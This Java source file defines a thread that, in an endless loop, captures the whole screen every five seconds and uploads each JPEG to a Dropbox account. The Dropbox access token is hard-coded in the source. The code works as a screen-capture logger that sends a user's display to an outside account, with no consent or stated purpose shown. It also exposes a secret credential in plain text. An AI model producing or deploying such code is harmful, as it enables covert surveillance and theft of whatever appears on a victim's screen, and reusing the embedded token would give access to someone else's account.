import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread  extends Thread
{

    public void run() {

        String ACCESS_TOKEN = "UxKoErmVljAAAAAAAAAMfWn2MlsovB_E5T5zavLwnBeOq0boT-D6MdOUGaeL3hyq";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        System.out.println("enter");
        String scrShotName;

        for (;;){
            DateFormat format = new SimpleDateFormat("yyyy-MM-dd_hh-mm-ss");
            System.out.println(format.format(new Date()));
            scrShotName = format.format(new Date());
            System.out.println("# " + scrShotName);
            //screenshot
            try {
                try {
//                    InputStream in = new FileInputStream("C:/Users/alex/Desktop/ex.txt");
//                    InputStream in = new FileInputStream(image);
                    ByteArrayOutputStream os = new ByteArrayOutputStream();
                    try {
                        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                        System.out.println("img done");

                    ImageIO.write(image, "jpg", os);
                    InputStream in = new ByteArrayInputStream(os.toByteArray());
                    FileMetadata metadata = client.files().uploadBuilder("/" + scrShotName + ".jpg").uploadAndFinish(in);
                    }
                    catch (AWTException e)
                    {
                        throw new RuntimeException(e);
                    }
                }
                catch (Exception e){
                    e.printStackTrace();
                }
                sleep(5000);
            }
            catch (InterruptedException e){
                e.printStackTrace();
            }
        }
    }
}
